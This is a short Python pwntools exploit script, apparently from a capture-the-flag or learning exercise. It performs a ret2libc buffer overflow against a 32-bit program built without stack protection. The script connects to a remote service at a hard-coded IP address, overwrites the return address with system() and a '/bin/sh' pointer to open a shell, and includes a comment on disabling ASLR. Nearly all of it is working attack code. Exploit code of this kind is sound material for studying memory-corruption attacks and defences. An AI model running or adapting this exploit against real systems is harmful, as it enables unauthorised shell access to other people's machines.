from pwn import *

#TURN OFF ASLR : echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
#Compiled with: gcc -m32 -fno-stack-protector -no-pie rop.c -o rop
#A simple ret2libc exploit!
#r = process('./rop')
r = remote('45.77.51.4',8889)
#r = gdb.debug('./rop', '''b *0x80485be ''')
print(r.recvuntil("name:"))
name = "CCCC"
r.send(name + "\n") #give our name :)

#here we need 84 bytes to overwrite EIP. 
#annoyingly, our buffer gets placed into stdin aswell so we churn those bytes into the newly created shell. thats why id; is here.
job = "id;" + "A"*73

#EIP control is cool, but we actually want a shell.. so lets build a ropchain.
system = 0xf7e4eda0
binsh_stack = 0xffffd8cd
binsh_libc = 0xf7f6f9ab
saved_ebp = "BBBB" # dummy bytes!
dummy_frame = job + saved_ebp + p32(system) + "CCCC" + p32(binsh_libc)

#With the above dummy stack frame we will have the following layout:
# Heres what the original is:
# [ Buffer ] 
# [ Saved EBP ]
# [ Return Address ]
# [ Arguments for the function ]
# [ Caller function stack frame ...]

# Heres what we now have:
# [ Buffer ]
# [ Fake Saved EBP ] 
# [ System Address ]
# [ 4 dummy bytes ]
# [ binsh ptr ]
# [ Caller function stack frame ...] 

print(r.recvuntil("summary:"))
r.sendline(dummy_frame)

#now we actually need to copy those 84 bytes with our num_years
print(r.recvuntil("role:"))
r.sendline("84") #this should always be 84 but v0v

print(r.recvall())
r.interactive()


